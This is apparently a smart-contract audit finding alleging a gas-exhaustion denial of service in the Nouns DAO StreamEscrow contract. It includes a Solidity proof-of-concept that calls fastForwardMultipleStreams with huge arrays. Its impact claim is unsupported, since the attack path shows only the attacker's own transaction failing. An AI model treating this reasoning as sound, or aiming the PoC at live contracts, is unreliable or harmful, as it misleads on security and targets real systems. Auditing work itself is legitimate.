# vah - Gas Exhaustion Vulnerability in StreamEscrow Contract

### Summary

A vulnerability exists in the `StreamEscrow` contract, specifically in the `cancelStreams` and `fastForwardMultipleStreams` functions, where unbounded processing of input arrays can lead to gas exhaustion. This can result in denial of service (DoS) for users attempting to interact with the contract.



### Root Cause

Contract: https://github.com/sherlock-audit/2024-11-nounsdao/blob/main/nouns-monorepo/packages/nouns-contracts/contracts/StreamEscrow.sol#L231

### Internal pre-conditions

_No response_

### External pre-conditions

### Attack Path

1. Deploy Malicious Contract
The attacker deploys a contract (GasExhaustionAttack) that creates large arrays and attempts to call the vulnerable functions.

2. Generate Large Arrays
The attacker creates arrays of arbitrary length using the malicious contract.

3. Call Vulnerable Function
The attacker calls fastForwardMultipleStreams with the large arrays, causing the transaction to consume excessive gas and fail.

### Impact

Denial of Service (DoS): The contract becomes unusable for legitimate users during an attack.


### PoC

```solidity
pragma solidity ^0.8.19;

contract GasExhaustionAttack {
    StreamEscrow public target;
    constructor(address _target) {
        target = StreamEscrow(_target);
    }
    function attack(uint256 largeNumber) external {
        uint256[] memory nounIds = new uint256[](largeNumber);
        uint32[] memory ticks = new uint32[](largeNumber);
        for(uint256 i = 0; i < largeNumber; i++) {
            nounIds[i] = i + 1;
            ticks[i] = 1;
        }
        target.fastForwardMultipleStreams(nounIds, ticks);
    }
}
```
